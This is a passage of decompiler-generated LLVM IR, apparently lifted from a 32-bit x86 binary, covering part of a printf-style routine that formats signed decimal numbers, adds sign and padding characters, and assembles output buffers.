  %v10_804fc70 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v10_804fc70, label %dec_label_pc_804fc68.dec_label_pc_804fc79_crit_edge, label %dec_label_pc_804fc75

dec_label_pc_804fc68.dec_label_pc_804fc79_crit_edge: ; preds = %dec_label_pc_804fc68
  %v0_804fc79.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fc79

dec_label_pc_804fc75:                             ; preds = %dec_label_pc_804fc4d, %dec_label_pc_804fc52, %dec_label_pc_804fc68
  %stack_var_-197.0 = phi i8 [ %stack_var_-206.1, %dec_label_pc_804fc68 ], [ 103, %dec_label_pc_804fc52 ], [ 103, %dec_label_pc_804fc4d ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fc83

dec_label_pc_804fc79:                             ; preds = %dec_label_pc_804fc68.dec_label_pc_804fc79_crit_edge, %dec_label_pc_804fc5d
  %v0_804fc79 = phi i32 [ %v0_804fc79.pre, %dec_label_pc_804fc68.dec_label_pc_804fc79_crit_edge ], [ %v0_804fc4d, %dec_label_pc_804fc5d ]
  store i32 %v0_804fc79, i32* %ebx.global-to-local, align 4
  %v2_804fc7b = icmp slt i32 %v0_804fc79, 0
  %v1_804fc7d = icmp eq i1 %v2_804fc7b, false
  br i1 %v1_804fc7d, label %dec_label_pc_804fc83, label %dec_label_pc_804fc7f

dec_label_pc_804fc7f:                             ; preds = %dec_label_pc_804fc79
  %v0_804fc7f = load i32, i32* %edx.global-to-local, align 4
  %v1_804fc7f = add i32 %v0_804fc7f, -1
  store i32 %v1_804fc7f, i32* %edx.global-to-local, align 4
  %v1_804fc80 = inttoptr i32 %v1_804fc7f to i8*
  store i8 48, i8* %v1_804fc80, align 1
  %v0_804fcb8.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fc83

dec_label_pc_804fc83:                             ; preds = %dec_label_pc_804fc79, %dec_label_pc_804fc75, %dec_label_pc_804fc7f
  %v1_804fd13 = phi i32 [ %v0_804fc79, %dec_label_pc_804fc79 ], [ %v0_804fcb8.pre, %dec_label_pc_804fc7f ], [ 0, %dec_label_pc_804fc75 ]
  %stack_var_-197.2 = phi i8 [ 102, %dec_label_pc_804fc79 ], [ 102, %dec_label_pc_804fc7f ], [ %stack_var_-197.0, %dec_label_pc_804fc75 ]
  %v2_804fc83 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_804fc83, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v0_804fc9e = load i32, i32* %edx.global-to-local, align 4
  %v1_804fc9e = inttoptr i32 %v0_804fc9e to i8*
  %v2_804fc9e = load i8, i8* %v1_804fc9e, align 1
  %v3_804fc9e = zext i8 %v2_804fc9e to i32
  %v5_804fc9e = and i32 %v2_804fc83, -256
  %v6_804fc9e = or i32 %v3_804fc9e, %v5_804fc9e
  store i32 %v6_804fc9e, i32* %eax.global-to-local, align 4
  %v1_804fca0 = add i32 %v0_804fc9e, 1
  store i32 %v1_804fca0, i32* %edi.global-to-local, align 4
  store i32 %v6_804fc9e, i32* %stack_var_-22, align 4
  %v2_804fcae = sub i32 %v1_804fc3b, %v1_804fca0
  store i32 %v2_804fcae, i32* %edx.global-to-local, align 4
  %v1_804fcb8 = icmp eq i32 %v1_804fd13, 0
  %v2_804fcb8 = icmp slt i32 %v1_804fd13, 0
  br i1 %v2_804fcb8, label %dec_label_pc_804fd07, label %dec_label_pc_804fcbc

dec_label_pc_804fcbc:                             ; preds = %dec_label_pc_804fc83
  store i32 112, i32* %stack_var_-144, align 4
  %v2_804fcc8 = sub i32 %v1_804fd13, %v2_804fcae
  %v8_804fcc8 = xor i32 %v2_804fcae, %v1_804fd13
  %v9_804fcc8 = xor i32 %v2_804fcc8, %v1_804fd13
  %v10_804fcc8 = and i32 %v9_804fcc8, %v8_804fcc8
  %v11_804fcc8 = icmp slt i32 %v10_804fcc8, 0
  %v13_804fcc8 = icmp slt i32 %v2_804fcc8, 0
  %v2_804fcca = icmp eq i1 %v13_804fcc8, %v11_804fcc8
  br i1 %v2_804fcca, label %dec_label_pc_804fccc, label %dec_label_pc_804fd00

dec_label_pc_804fccc:                             ; preds = %dec_label_pc_804fcbc
  store i32 %v2_804fcc8, i32* %eax.global-to-local, align 4
  %tmp137 = icmp slt i32 %v2_804fcc8, 1
  %tmp138 = icmp eq i1 %tmp137, false
  br i1 %tmp138, label %dec_label_pc_804fce1, label %dec_label_pc_804fcfc

dec_label_pc_804fce1:                             ; preds = %dec_label_pc_804fccc
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_804fcfc

dec_label_pc_804fcfc:                             ; preds = %dec_label_pc_804fccc, %dec_label_pc_804fce1
  %storemerge9.in = phi i32* [ %stack_var_-120, %dec_label_pc_804fce1 ], [ %stack_var_-132, %dec_label_pc_804fccc ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge9 = ptrtoint i32* %storemerge9.in to i32
  store i32 %storemerge9, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fd1c

dec_label_pc_804fd00:                             ; preds = %dec_label_pc_804fcbc
  %v4_804fd02 = icmp eq i1 %v1_804fcb8, false
  br i1 %v4_804fd02, label %dec_label_pc_804fd0d, label %dec_label_pc_804fd04

dec_label_pc_804fd04:                             ; preds = %dec_label_pc_804fd00
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fd07

dec_label_pc_804fd07:                             ; preds = %dec_label_pc_804fc83, %dec_label_pc_804fd04
  %v0_804fd4f72 = phi i32 [ %v1_804fd13, %dec_label_pc_804fc83 ], [ -1, %dec_label_pc_804fd04 ]
  %v2_804fd07 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804fd07, i32* @ecx, align 4
  br label %dec_label_pc_804fd1c

dec_label_pc_804fd0d:                             ; preds = %dec_label_pc_804fd00
  %v2_804fd11 = add i32 %v1_804fca0, %v1_804fd13
  store i32 %v2_804fd11, i32* %edi.global-to-local, align 4
  %v2_804fd13 = sub i32 %v2_804fcae, %v1_804fd13
  store i32 %v2_804fd13, i32* %edx.global-to-local, align 4
  %v2_804fd15 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_804fd15, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fd1c

dec_label_pc_804fd1c:                             ; preds = %dec_label_pc_804fd07, %dec_label_pc_804fcfc, %dec_label_pc_804fd0d
  %v0_804fd4f71 = phi i32 [ %v0_804fd4f72, %dec_label_pc_804fd07 ], [ -1, %dec_label_pc_804fcfc ], [ -1, %dec_label_pc_804fd0d ]
  %v0_804fd38 = phi i32 [ %v2_804fd07, %dec_label_pc_804fd07 ], [ %storemerge9, %dec_label_pc_804fcfc ], [ %v2_804fd15, %dec_label_pc_804fd0d ]
  %v0_804fd29 = phi i32 [ %v2_804fcae, %dec_label_pc_804fd07 ], [ 0, %dec_label_pc_804fcfc ], [ %v2_804fd13, %dec_label_pc_804fd0d ]
  store i32 %tmp111, i32* %eax.global-to-local, align 4
  %v2_804fd23 = inttoptr i32 %v1_804f97b to i8*
  %v3_804fd23 = load i8, i8* %v2_804fd23, align 1
  %v4_804fd23 = and i8 %v3_804fd23, 16
  %v5_804fd23 = icmp eq i8 %v4_804fd23, 0
  %v1_804fd27 = icmp eq i1 %v5_804fd23, false
  br i1 %v1_804fd27, label %dec_label_pc_804fd38, label %dec_label_pc_804fd29

dec_label_pc_804fd29:                             ; preds = %dec_label_pc_804fd1c
  %v1_804fd29 = icmp eq i32 %v0_804fd29, 0
  %v1_804fd2b = icmp eq i1 %v1_804fd29, false
  br i1 %v1_804fd2b, label %dec_label_pc_804fd38, label %dec_label_pc_804fd2d

dec_label_pc_804fd2d:                             ; preds = %dec_label_pc_804fd29
  br i1 %v12_804fb91, label %dec_label_pc_804fd4f, label %dec_label_pc_804fd34

dec_label_pc_804fd34:                             ; preds = %dec_label_pc_804fd2d
  %v0_804fd34 = load i32, i32* %ebp.global-to-local, align 4
  %tmp139 = icmp slt i32 %v0_804fd34, 1
  br i1 %tmp139, label %dec_label_pc_804fd4f, label %dec_label_pc_804fd38

dec_label_pc_804fd38:                             ; preds = %dec_label_pc_804fd34, %dec_label_pc_804fd29, %dec_label_pc_804fd1c
  %v1_804fd38 = inttoptr i32 %v0_804fd38 to i32*
  store i32 112, i32* %v1_804fd38, align 4
  %v0_804fd3e = load i32, i32* @ecx, align 4
  %v1_804fd3e = add i32 %v0_804fd3e, 4
  %v2_804fd3e = inttoptr i32 %v1_804fd3e to i32*
  store i32 1, i32* %v2_804fd3e, align 4
  %v0_804fd45 = load i32, i32* @ecx, align 4
  %v1_804fd45 = add i32 %v0_804fd45, 8
  %v2_804fd45 = inttoptr i32 %v1_804fd45 to i32*
  store i32 ptrtoint (i32* @global_var_8054500.193 to i32), i32* %v2_804fd45, align 4
  %v0_804fd4c = load i32, i32* @ecx, align 4
  %v1_804fd4c = add i32 %v0_804fd4c, 12
  store i32 %v1_804fd4c, i32* @ecx, align 4
  %v0_804fd4f.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fd4f

dec_label_pc_804fd4f:                             ; preds = %dec_label_pc_804fd34, %dec_label_pc_804fd2d, %dec_label_pc_804fd38
  %v0_804fd54 = phi i32 [ %v0_804fd38, %dec_label_pc_804fd34 ], [ %v0_804fd38, %dec_label_pc_804fd2d ], [ %v1_804fd4c, %dec_label_pc_804fd38 ]
  %v0_804fd4f = phi i32 [ %v0_804fd4f71, %dec_label_pc_804fd34 ], [ %v0_804fd4f71, %dec_label_pc_804fd2d ], [ %v0_804fd4f.pre, %dec_label_pc_804fd38 ]
  %v1_804fd4f = add i32 %v0_804fd4f, 1
  %v8_804fd4f = icmp eq i32 %v1_804fd4f, 0
  store i32 %v1_804fd4f, i32* %ebx.global-to-local, align 4
  br i1 %v8_804fd4f, label %dec_label_pc_804fd69, label %dec_label_pc_804fd52

dec_label_pc_804fd52:                             ; preds = %dec_label_pc_804fd4f
  store i32 %v1_804fd4f, i32* %eax.global-to-local, align 4
  %v1_804fd54 = inttoptr i32 %v0_804fd54 to i32*
  store i32 176, i32* %v1_804fd54, align 4
  %v0_804fd5a = load i32, i32* %eax.global-to-local, align 4
  %v1_804fd5a = sub i32 0, %v0_804fd5a
  store i32 %v1_804fd5a, i32* %eax.global-to-local, align 4
  %v1_804fd5c = load i32, i32* @ecx, align 4
  %v2_804fd5c = add i32 %v1_804fd5c, 4
  %v3_804fd5c = inttoptr i32 %v2_804fd5c to i32*
  store i32 %v1_804fd5a, i32* %v3_804fd5c, align 4
  %v0_804fd5f = load i32, i32* @ecx, align 4
  %v1_804fd5f = add i32 %v0_804fd5f, 8
  %v2_804fd5f = inttoptr i32 %v1_804fd5f to i32*
  store i32 ptrtoint (i32* @global_var_80544f3.192 to i32), i32* %v2_804fd5f, align 4
  %v0_804fd66 = load i32, i32* @ecx, align 4
  %v1_804fd66 = add i32 %v0_804fd66, 12
  store i32 %v1_804fd66, i32* @ecx, align 4
  br label %dec_label_pc_804fd69

dec_label_pc_804fd69:                             ; preds = %dec_label_pc_804fd4f, %dec_label_pc_804fd52
  %v0_804fd6d = phi i32 [ %v0_804fd54, %dec_label_pc_804fd4f ], [ %v1_804fd66, %dec_label_pc_804fd52 ]
  %v0_804fd69 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fd69 = icmp eq i32 %v0_804fd69, 0
  br i1 %v1_804fd69, label %dec_label_pc_804fd7c, label %dec_label_pc_804fd6d

dec_label_pc_804fd6d:                             ; preds = %dec_label_pc_804fd69
  %v1_804fd6d = inttoptr i32 %v0_804fd6d to i32*
  store i32 112, i32* %v1_804fd6d, align 4
  %v0_804fd73 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fd73 = load i32, i32* @ecx, align 4
  %v2_804fd73 = add i32 %v1_804fd73, 4
  %v3_804fd73 = inttoptr i32 %v2_804fd73 to i32*
  store i32 %v0_804fd73, i32* %v3_804fd73, align 4
  %v0_804fd76 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fd76 = load i32, i32* @ecx, align 4
  %v2_804fd76 = add i32 %v1_804fd76, 8
  %v3_804fd76 = inttoptr i32 %v2_804fd76 to i32*
  store i32 %v0_804fd76, i32* %v3_804fd76, align 4
  %v0_804fd79 = load i32, i32* @ecx, align 4
  %v1_804fd79 = add i32 %v0_804fd79, 12
  store i32 %v1_804fd79, i32* @ecx, align 4
  br label %dec_label_pc_804fd7c

dec_label_pc_804fd7c:                             ; preds = %dec_label_pc_804fd69, %dec_label_pc_804fd6d
  %v0_804fd9a = phi i32 [ %v0_804fd6d, %dec_label_pc_804fd69 ], [ %v1_804fd79, %dec_label_pc_804fd6d ]
  br i1 %v1_804fb96, label %dec_label_pc_804fd90, label %dec_label_pc_804fd83

dec_label_pc_804fd83:                             ; preds = %dec_label_pc_804fd7c
  store i32 %tmp111, i32* %eax.global-to-local, align 4
  %v3_804fd8a = load i8, i8* %v2_804fd23, align 1
  %v4_804fd8a = and i8 %v3_804fd8a, 16
  %v5_804fd8a = icmp eq i8 %v4_804fd8a, 0
  br i1 %v5_804fd8a, label %dec_label_pc_804fdad, label %dec_label_pc_804fd90

dec_label_pc_804fd90:                             ; preds = %dec_label_pc_804fd83, %dec_label_pc_804fd7c
  %v0_804fd90 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fd92 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804fd92 = sub i32 %v0_804fd90, %v1_804fd92
  store i32 %v2_804fd92, i32* %eax.global-to-local, align 4
  %v1_804fd94 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804fd94 = sub i32 %v2_804fd92, %v1_804fd94
  %v8_804fd94 = xor i32 %v1_804fd94, %v2_804fd92
  %v9_804fd94 = xor i32 %v2_804fd94, %v2_804fd92
  %v10_804fd94 = and i32 %v9_804fd94, %v8_804fd94
  %v11_804fd94 = icmp slt i32 %v10_804fd94, 0
  %v13_804fd94 = icmp slt i32 %v2_804fd94, 0
  %v2_804fd96 = icmp eq i1 %v13_804fd94, %v11_804fd94
  br i1 %v2_804fd96, label %dec_label_pc_804fdad, label %dec_label_pc_804fd98

dec_label_pc_804fd98:                             ; preds = %dec_label_pc_804fd90
  %v2_804fd98 = sub i32 %v1_804fd94, %v2_804fd92
  store i32 %v2_804fd98, i32* %ebp.global-to-local, align 4
  %v1_804fd9a = inttoptr i32 %v0_804fd9a to i32*
  store i32 176, i32* %v1_804fd9a, align 4
  %v0_804fda0 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804fda0 = load i32, i32* @ecx, align 4
  %v2_804fda0 = add i32 %v1_804fda0, 4
  %v3_804fda0 = inttoptr i32 %v2_804fda0 to i32*
  store i32 %v0_804fda0, i32* %v3_804fda0, align 4
  %v0_804fda3 = load i32, i32* @ecx, align 4
  %v1_804fda3 = add i32 %v0_804fda3, 8
  %v2_804fda3 = inttoptr i32 %v1_804fda3 to i32*
  store i32 ptrtoint (i32* @global_var_80544f3.192 to i32), i32* %v2_804fda3, align 4
  %v0_804fdaa = load i32, i32* @ecx, align 4
  %v1_804fdaa = add i32 %v0_804fdaa, 12
  store i32 %v1_804fdaa, i32* @ecx, align 4
  br label %dec_label_pc_804fdad

dec_label_pc_804fdad:                             ; preds = %dec_label_pc_804fd90, %dec_label_pc_804fd83, %dec_label_pc_804fd98
  %v1_804fe3083 = phi i32 [ %v0_804fd9a, %dec_label_pc_804fd90 ], [ %v0_804fd9a, %dec_label_pc_804fd83 ], [ %v1_804fdaa, %dec_label_pc_804fd98 ]
  %v12_804fdad = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_804fdad, label %dec_label_pc_804fe23, label %dec_label_pc_804fdb4

dec_label_pc_804fdb4:                             ; preds = %dec_label_pc_804fdad
  %v0_804fdbb = load i32, i32* %esi.global-to-local, align 4
  %v2_804fdbb = icmp slt i32 %v0_804fdbb, 0
  %v1_804fdbd = trunc i32 %stack_var_-42.0 to i8
  store i32 %v0_804fdbb, i32* %edx.global-to-local, align 4
  br i1 %v2_804fdbb, label %dec_label_pc_804fdcc, label %dec_label_pc_804fdc3

dec_label_pc_804fdc3:                             ; preds = %dec_label_pc_804fdb4
  store i32 43, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fdd5

dec_label_pc_804fdcc:                             ; preds = %dec_label_pc_804fdb4
  store i32 45, i32* %edi.global-to-local, align 4
  %v1_804fdd3 = sub i32 0, %v0_804fdbb
  store i32 %v1_804fdd3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fdd5

dec_label_pc_804fdd5:                             ; preds = %dec_label_pc_804fdc3, %dec_label_pc_804fdcc
  %v0_804fde976 = phi i32 [ %v0_804fdbb, %dec_label_pc_804fdc3 ], [ %v1_804fdd3, %dec_label_pc_804fdcc ]
  store i32 0, i32* %stack_var_-27, align 4
  %v2_804fddd = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_804fddd, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fde9

dec_label_pc_804fde9:                             ; preds = %dec_label_pc_804fde9.backedge, %dec_label_pc_804fdd5
  %v0_804fdf7 = phi i32 [ %v0_804fdfa, %dec_label_pc_804fde9.backedge ], [ 2, %dec_label_pc_804fdd5 ]
  %v0_804fdf3 = phi i32 [ %v0_804fdf3.pre, %dec_label_pc_804fde9.backedge ], [ %v2_804fddd, %dec_label_pc_804fdd5 ]
  %v0_804fde9 = phi i32 [ %v9_804fdf1, %dec_label_pc_804fde9.backedge ], [ %v0_804fde976, %dec_label_pc_804fdd5 ]
  store i32 10, i32* %ebp.global-to-local, align 4
  %v1_804fdf0 = ashr i32 %v0_804fde9, 31
  %v2_804fdf1 = zext i32 %v0_804fde9 to i64
  %v4_804fdf1 = zext i32 %v1_804fdf0 to i64
  %v5_804fdf1 = mul nuw i64 %v4_804fdf1, 4294967296
  %v6_804fdf1 = or i64 %v5_804fdf1, %v2_804fdf1
  %v8_804fdf1 = sdiv i64 %v6_804fdf1, 10
  %v9_804fdf1 = trunc i64 %v8_804fdf1 to i32
  store i32 %v9_804fdf1, i32* %eax.global-to-local, align 4
  %v11_804fdf1 = srem i64 %v6_804fdf1, 10
  %v12_804fdf1 = trunc i64 %v11_804fdf1 to i8
  %v1_804fdf3 = add i32 %v0_804fdf3, -1
  store i32 %v1_804fdf3, i32* %ebx.global-to-local, align 4
  %v1_804fdf4 = add i8 %v12_804fdf1, 48
  %v1_804fdf7 = add i32 %v0_804fdf7, 1
  store i32 %v1_804fdf7, i32* %esi.global-to-local, align 4
  %v3_804fdf8 = inttoptr i32 %v1_804fdf3 to i8*
  store i8 %v1_804fdf4, i8* %v3_804fdf8, align 1
  %v0_804fdfa = load i32, i32* %esi.global-to-local, align 4
  store i32 %v9_804fdf1, i32* %edx.global-to-local, align 4
  %v7_804fdff = icmp sgt i32 %v0_804fdfa, 3
  br i1 %v7_804fdff, label %dec_label_pc_804fe01, label %dec_label_pc_804fde9.backedge

dec_label_pc_804fe01:                             ; preds = %dec_label_pc_804fde9
  %v2_804fe01 = icmp eq i32 %v9_804fdf1, 0
  %v1_804fe03 = icmp eq i1 %v2_804fe01, false
  br i1 %v1_804fe03, label %dec_label_pc_804fde9.backedge, label %dec_label_pc_804fe05

dec_label_pc_804fde9.backedge:                    ; preds = %dec_label_pc_804fe01, %dec_label_pc_804fde9
  %v0_804fdf3.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fde9

dec_label_pc_804fe05:                             ; preds = %dec_label_pc_804fe01
  %v0_804fe05 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804fe05, i32* %edx.global-to-local, align 4
  %v0_804fe07 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fe07 = add i32 %v0_804fe07, -2
  store i32 %v1_804fe07, i32* %eax.global-to-local, align 4
  %v1_804fe0a = trunc i32 %v0_804fe05 to i8
  %v3_804fe0a = add i32 %v0_804fe07, -1
  %v4_804fe0a = inttoptr i32 %v3_804fe0a to i8*
  store i8 %v1_804fe0a, i8* %v4_804fe0a, align 1
  %v5_804fe0d = load i32, i32* %edx.global-to-local, align 4
  %v6_804fe0d = and i32 %v5_804fe0d, -256
  %v7_804fe0d = or i32 %v6_804fe0d, %stack_var_-42.0
  store i32 %v7_804fe0d, i32* %edx.global-to-local, align 4
  %v2_804fe11 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804fe11 = add i32 %v2_804fe11, -2
  %v4_804fe11 = inttoptr i32 %v3_804fe11 to i8*
  store i8 %v1_804fdbd, i8* %v4_804fe11, align 1
  %v0_804fe14 = load i32, i32* @ecx, align 4
  %v1_804fe14 = inttoptr i32 %v0_804fe14 to i32*
  store i32 112, i32* %v1_804fe14, align 4
  %v0_804fe1a = load i32, i32* %esi.global-to-local, align 4
  %v1_804fe1a = load i32, i32* @ecx, align 4
  %v2_804fe1a = add i32 %v1_804fe1a, 4
  %v3_804fe1a = inttoptr i32 %v2_804fe1a to i32*
  store i32 %v0_804fe1a, i32* %v3_804fe1a, align 4
  %v0_804fe1d = load i32, i32* %eax.global-to-local, align 4
  %v1_804fe1d = load i32, i32* @ecx, align 4
  %v2_804fe1d = add i32 %v1_804fe1d, 8
  %v3_804fe1d = inttoptr i32 %v2_804fe1d to i32*
  store i32 %v0_804fe1d, i32* %v3_804fe1d, align 4
  %v0_804fe20 = load i32, i32* @ecx, align 4
  %v1_804fe20 = add i32 %v0_804fe20, 12
  store i32 %v1_804fe20, i32* @ecx, align 4
  br label %dec_label_pc_804fe23

dec_label_pc_804fe23:                             ; preds = %dec_label_pc_804fdad, %dec_label_pc_804fa48, %dec_label_pc_804fe05
  %v0_804fea4 = phi i32 [ %v1_804fe3083, %dec_label_pc_804fdad ], [ %v2_804fa50, %dec_label_pc_804fa48 ], [ %v1_804fe20, %dec_label_pc_804fe05 ]
  %v2_804fe23 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_804fe23, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fe27

dec_label_pc_804fe27:                             ; preds = %dec_label_pc_804fe27, %dec_label_pc_804fe23
  %v0_804fe27 = phi i32 [ %v2_804fe23, %dec_label_pc_804fe23 ], [ %v1_804fe29, %dec_label_pc_804fe27 ]
  %stack_var_-216.0 = phi i32 [ %v3_804f93b, %dec_label_pc_804fe23 ], [ %v5_804fe2c, %dec_label_pc_804fe27 ]
  %v1_804fe27 = inttoptr i32 %v0_804fe27 to i32*
  %v2_804fe27 = load i32, i32* %v1_804fe27, align 4
  store i32 %v2_804fe27, i32* %edx.global-to-local, align 4
  %v1_804fe29 = add i32 %v0_804fe27, 12
  store i32 %v1_804fe29, i32* %eax.global-to-local, align 4
  %v5_804fe2c = sub i32 %stack_var_-216.0, %v2_804fe27
  %v7_804fe30 = icmp ult i32 %v1_804fe29, %v0_804fea4
  br i1 %v7_804fe30, label %dec_label_pc_804fe27, label %dec_label_pc_804fe34

dec_label_pc_804fe34:                             ; preds = %dec_label_pc_804fe27
  %v5_804fe3d = icmp eq i8 %stack_var_-26.0, 0
  %v1_804fe4d = icmp eq i1 %v5_804fe3d, false
  %v2_804fe4d = zext i1 %v1_804fe4d to i32
  %v2_804fe50 = sub i32 %v5_804fe2c, %v2_804fe4d
  store i32 %v2_804fe50, i32* %edx.global-to-local, align 4
  store i32 160, i32* %stack_var_-168, align 4
  store i32 %v2_804fe50, i32* %eax.global-to-local, align 4
  store i32 %v0_804fea4, i32* %esi.global-to-local, align 4
  %tmp140 = icmp slt i32 %v2_804fe50, 1
  br i1 %tmp140, label %dec_label_pc_804fea6, label %dec_label_pc_804fe66

dec_label_pc_804fe66:                             ; preds = %dec_label_pc_804fe34
  store i32 %tmp111, i32* %edx.global-to-local, align 4
  %v2_804fe6d = inttoptr i32 %v1_804f97b to i8*
  %v3_804fe6d = load i8, i8* %v2_804fe6d, align 1
  %v4_804fe6d = and i8 %v3_804fe6d, 8
  %v5_804fe6d = icmp eq i8 %v4_804fe6d, 0
  br i1 %v5_804fe6d, label %dec_label_pc_804fe88, label %dec_label_pc_804fe73

dec_label_pc_804fe73:                             ; preds = %dec_label_pc_804fe66
  %v1_804fe73 = add i32 %v0_804fea4, 12
  store i32 %v1_804fe73, i32* %esi.global-to-local, align 4
  %v1_804fe76 = inttoptr i32 %v0_804fea4 to i32*
  store i32 160, i32* %v1_804fe76, align 4
  %v0_804fe7c = load i32, i32* %eax.global-to-local, align 4
  %v1_804fe7c = load i32, i32* @ecx, align 4
  %v2_804fe7c = add i32 %v1_804fe7c, 4
  %v3_804fe7c = inttoptr i32 %v2_804fe7c to i32*
  store i32 %v0_804fe7c, i32* %v3_804fe7c, align 4
  %v0_804fe7f = load i32, i32* @ecx, align 4
  %v1_804fe7f = add i32 %v0_804fe7f, 8
  %v2_804fe7f = inttoptr i32 %v1_804fe7f to i32*
  store i32 ptrtoint (i32* @global_var_80544f3.192 to i32), i32* %v2_804fe7f, align 4
  br label %dec_label_pc_804fea6

dec_label_pc_804fe88:                             ; preds = %dec_label_pc_804fe66
  store i32 %tmp111, i32* %edx.global-to-local, align 4
  %v1_804fe8f = add i32 %tmp111, 16
  %v2_804fe8f = inttoptr i32 %v1_804fe8f to i32*
  %v3_804fe8f = load i32, i32* %v2_804fe8f, align 4
  %v9_804fe8f = icmp eq i32 %v3_804fe8f, 48
  %v1_804fe93 = icmp eq i1 %v9_804fe8f, false
  br i1 %v1_804fe93, label %dec_label_pc_804fea0, label %dec_label_pc_804fe95

dec_label_pc_804fe95:                             ; preds = %dec_label_pc_804fe88
  %v3_804fe95 = load i32, i32* %stack_var_-152, align 4
  %v5_804fe95 = add i32 %v3_804fe95, %v2_804fe50
  store i32 %v5_804fe95, i32* %stack_var_-152, align 4
  br label %dec_label_pc_804fea4

dec_label_pc_804fe9b:                             ; preds = %dec_label_pc_804feac
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fed3

dec_label_pc_804fea0:                             ; preds = %dec_label_pc_804fe88
  br label %dec_label_pc_804fea4

dec_label_pc_804fea4:                             ; preds = %dec_label_pc_804fe95, %dec_label_pc_804fea0
  store i32 %v0_804fea4, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fea6

dec_label_pc_804fea6:                             ; preds = %dec_label_pc_804fe34, %dec_label_pc_804fe73, %dec_label_pc_804fea4
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_804fea8 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_804fea8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804feac

dec_label_pc_804feac:                             ; preds = %dec_label_pc_804feca, %dec_label_pc_804fea6
  call void @__pseudo_call(i32 %tmp111)
  %v0_804fec5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fec5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804fec5 = add i32 %v1_804fec5, 4
  %v3_804fec5 = inttoptr i32 %v2_804fec5 to i32*
  %v4_804fec5 = load i32, i32* %v3_804fec5, align 4
  %v15_804fec5 = icmp eq i32 %v0_804fec5, %v4_804fec5
  %v1_804fec8 = icmp eq i1 %v15_804fec5, false
  br i1 %v1_804fec8, label %dec_label_pc_804fe9b, label %dec_label_pc_804feca

dec_label_pc_804feca:                             ; preds = %dec_label_pc_804feac
  %v1_804feca = add i32 %v1_804fec5, 12
  store i32 %v1_804feca, i32* %ebx.global-to-local, align 4
  %v0_804fecd = load i32, i32* %edi.global-to-local, align 4
  %v2_804fecd = add i32 %v0_804fecd, %v0_804fec5
  store i32 %v2_804fecd, i32* %edi.global-to-local, align 4
  %v1_804fecf = load i32, i32* %esi.global-to-local, align 4
  %v7_804fecf = icmp ult i32 %v1_804feca, %v1_804fecf
  br i1 %v7_804fecf, label %dec_label_pc_804feac, label %dec_label_pc_804fed3

dec_label_pc_804fed3:                             ; preds = %dec_label_pc_804feca, %dec_label_pc_804fe9b
  %v0_804fed9 = phi i32 [ -1, %dec_label_pc_804fe9b ], [ %v2_804fecd, %dec_label_pc_804feca ]
  store i32 %v0_804fed9, i32* %eax.global-to-local, align 4
  %v2_804fedc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804fedc, i32* @esi, align 4
  store i32 %v0_804f91e, i32* @edi, align 4
  store i32 %v0_804f91d, i32* @ebp, align 4
  ret i32 %v0_804fed9

; uselistorder directives
  uselistorder i32 %v0_804fed9, { 1, 0 }
  uselistorder i32 %v1_804fe29, { 1, 2, 0 }
  uselistorder i32 %v0_804fe27, { 1, 0 }
  uselistorder i32 %v0_804fea4, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_804fdfa, { 1, 0 }
  uselistorder i32 %v9_804fdf1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804fde9, { 1, 0 }
  uselistorder i32 %v0_804fdbb, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804fd94, { 1, 0 }
  uselistorder i32 %v1_804fd94, { 1, 0, 2 }
  uselistorder i32 %v2_804fd92, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_804fcc8, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804fcae, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_804fd13, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v0_804fc79, { 0, 2, 1 }
  uselistorder i32 %v1_804fc52, { 1, 0 }
  uselistorder i32 %v0_804fc4d, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804fc1a, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_804fc15, { 1, 0 }
